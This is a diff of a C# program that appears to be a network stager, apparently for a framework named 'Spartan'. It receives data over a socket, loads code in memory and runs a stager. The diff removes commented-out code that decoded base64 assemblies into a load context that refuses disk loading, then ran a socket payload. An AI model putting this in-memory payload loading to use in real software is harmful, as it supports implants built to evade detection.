@@ -15,9 +15,6 @@ class Program
 
         var binaryReader = new BinaryReader(networkStream);
         var binaryWriter = new BinaryWriter(networkStream);
-        //
-        // var payloadLength = binaryReader.ReadInt32();
-        // var payloadBytes = binaryReader.ReadBytes(payloadLength);
         
         using var dataStream = new MemoryStream();
         
@@ -62,40 +59,5 @@ class Program
         dynamic stager = Convert.ChangeType(stagerInstance, stagerType!)!;
 
         stager.Run();
-
-        // var mainAssemblyStream = new MemoryStream(Convert.FromBase64String(assemblyBinaries[pluginEntryPoint]));
-        // var mainAssembly = assemblyLoadContext.LoadFromStream(mainAssemblyStream);
-        //
-        // // Load dependencies into the load context
-        // foreach (var (assemblyName, assemblyBytes) in payload)
-        // {
-        //     var dependencyStream = new MemoryStream(Convert.FromBase64String(assemblyBytes));
-        //     var assembly = payloadLoadContext.LoadFromStream(dependencyStream);
-        //     if (assemblyName == "Spartan.Payload")
-        //     {
-        //         payloadAssembly = assembly;
-        //     }
-        // }
-        //
-        // // Instantiate and execute the payload
-        // var pluginType = payloadAssembly.GetType("Spartan.Payload.SocketClient");
-        // var pluginInstance = Activator.CreateInstance(pluginType, binaryReader, binaryWriter);
-        // dynamic plugin = Convert.ChangeType(pluginInstance, pluginType);
-        //
-        // while (true)
-        // {
-        //     var data = Encoding.UTF8.GetString(plugin.ReceiveData());
-        //     var response = $"You said: {data}";
-        //     plugin.SendData(Encoding.UTF8.GetBytes(response));
-        // }
     }
 }
-
-// class PayloadLoadContext : AssemblyLoadContext
-// {
-//     protected override Assembly Load(AssemblyName assemblyName)
-//     {
-//         // Prevent default loading from disk
-//         return null;
-//     }
-// }
